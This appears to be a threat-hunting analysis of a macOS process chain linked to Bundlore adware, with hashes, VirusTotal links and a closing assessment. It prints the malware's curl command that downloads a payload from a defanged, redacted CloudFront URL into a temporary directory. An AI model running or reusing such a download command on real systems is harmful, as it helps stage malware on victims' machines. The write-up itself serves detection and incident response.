# Scenario #4 Analysis

```text

Grand-Parent Process: /private/tmp/b6yNLWzjO 

#https://www.virustotal.com/gui/file/96792f6318b530f40868c3bde69f8fad0ff6ce7e646bd702e93d3633e033c4bb labeled OSX, adware.bundlore/bnodlero
Grand-Parent MD5: ab47aa51b678216bc998fe7e5fe7aefd

#The system shows signs of potentially malicious activity originating from the executable /private/tmp/b6yNLWzjO
Grand-Parent CLI:
/tmp/b6yNLWzjO /Volumes/Installer/Installer.app/Contents/MacOS/LightEvening



#launched a parent shell process 
Parent Process: /bin/sh

#https://www.virustotal.com/gui/file/6de76ab470a16b2a825d223b996d994623473c694c60fccbb71af8691e61c5e0
Parent MD5: 95d23ed8b5448779eee9863d2bc5c1ba

#executing a curl command to download a file from a suspicious CloudFront URL
Parent CLI: 
sh -c curl -f0L -o /tmp/EB1E53E9-6B2A-4D01-99FF-DB4CB484EA63/45D77C73-D4A2-4698-A0A1-34926AEDF82D ’hxxp://redacted.cloudfront[.]net/sd/?c=22lybQ==&u=67D936BA-DC18-5557-AF59-A61155059BC5&s=EB1E53E9-6B2A-4D01-99FF-DB4CB484EA63&o=10.15.7&b=11821208528&gs=1' > /dev/null 2>&1



#download the payload to a temporary directory 
Process: /usr/bin/curl

#https://www.virustotal.com/gui/file/af20aa17b66b6bfcb63afd217cf0c6b931b88e916ec20286cce8b7c4c1e9c854
Process MD5: 0846e04c22488b04222817529f235024

Process CLI:
curl -f0L -o /tmp/EB1E53E9-6B2A-4D01-99FF-DB4CB484EA63/45D77C73-D4A2-4698-A0A1-34926AEDF82D hxxp://redacted.cloudfront[.]net/sd/?c=22lybQ==&u=67D936BA-DC18-5557-AF59-A61155059BC5&s=EB1E53E9-6B2A-4D01-99FF-DB4CB484EA63&o=10.15.7&b=11821208528&gs=1

#two active network connections and three file modifications, this behavior suggests an attempt to download and potentially execute malicious software
Network connection count: 2
File modifications: 3
```

**Overview**
The process chain exhibits characteristics of malicious behavior, leveraging a temporary binary (`/private/tmp/b6yNLWzjO`) as the **grand-parent process** to initiate a **parent shell process** (`/bin/sh`) for executing a `curl` command. 
The command fetches a file from a suspicious CloudFront-hosted URL (`hxxp://redacted.cloudfront[.]net/sd/...`) and writes it to a temporary directory (`/tmp/EB1E53E9-6B2A-4D01-99FF-DB4CB484EA63`). 
The fetched file's path, combined with associated **file modifications** and **network connections**, suggests an attempt to deploy a payload or establish persistence. 

**Summary**
This process chain demonstrates a highly suspicious sequence indicative of malware delivery or staging activity. The use of temporary binaries, unauthorized network activity, and file modifications aligns with tactics used for initial access, payload delivery, and execution. Immediate investigation into the source of the temporary binary, the contents of the downloaded file, and system integrity is warranted to mitigate further compromise.
